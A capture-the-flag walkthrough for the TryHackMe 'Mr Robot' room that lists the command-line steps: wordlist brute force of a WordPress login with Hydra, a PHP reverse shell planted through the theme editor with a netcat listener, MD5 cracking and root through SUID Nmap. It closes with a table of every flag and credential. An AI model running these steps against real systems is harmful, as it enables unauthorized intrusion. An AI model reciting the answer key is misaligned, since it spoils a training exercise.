# Mr Robot CTF

{% embed url="https://tryhackme.com/room/mrrobot" %}

Three keys hidden across a Mr. Robot-themed Linux machine. Involves `robots.txt`, WordPress brute force, and Nmap SUID escalation.

---

## Recon

```bash
nmap -sC -sV -T4 MACHINE_IP
```

| Port | Service |
|---|---|
| 22 | SSH (closed) |
| 80 | HTTP (Apache) |
| 443 | HTTPS |

---

## Key 1 — robots.txt

Visit `http://MACHINE_IP/robots.txt`:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Grab both:

```bash
curl http://MACHINE_IP/key-1-of-3.txt
curl http://MACHINE_IP/fsocity.dic -o fsocity.dic
```

**Key 1: `073403c8a58a1f80d943455fb30724b9`**

`fsocity.dic` is a wordlist we'll use for brute force. Clean it up first:

```bash
sort -u fsocity.dic > fsocity_uniq.dic
```

---

## WordPress Brute Force

Gobuster finds `/wp-login`:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Try username `elliot` (Mr. Robot character) on the login form — error message confirms it's valid. Brute force the password:

```bash
hydra -l elliot -P fsocity_uniq.dic MACHINE_IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

**Credentials: `elliot:ER28-0652`**

---

## Reverse Shell via Theme Editor

Log in to WordPress admin. Go to **Appearance → Theme Editor → 404.php**. Replace it with a PentestMonkey PHP reverse shell (update IP and port).

Start listener:

```bash
nc -lvnp 4444
```

Trigger the shell:

```bash
curl http://MACHINE_IP/wp-content/themes/twentyfifteen/404.php
```

We get a shell as `daemon`. Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Key 2 — robot's MD5

```bash
ls /home/robot/
# key-2-of-3.txt  password.raw-md5
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack it — it's MD5 of `abcdefghijklmnopqrstuvwxyz`:

```bash
echo -n "abcdefghijklmnopqrstuvwxyz" | md5sum
```

Switch user:

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

**Key 2: `822c73956184f694993bebb3eb32a1f9`**

---

## Key 3 — Nmap SUID Escalation

```bash
find / -perm /4000 2>/dev/null
```

`/usr/local/bin/nmap` has SUID. Old Nmap has an interactive mode:

```bash
nmap --interactive
nmap> !sh
id   # uid=0(root)
cat /root/key-3-of-3.txt
```

**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bebb3eb32a1f9` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |
| WordPress credentials | `elliot:ER28-0652` |
| robot's cracked password | `abcdefghijklmnopqrstuvwxyz` |
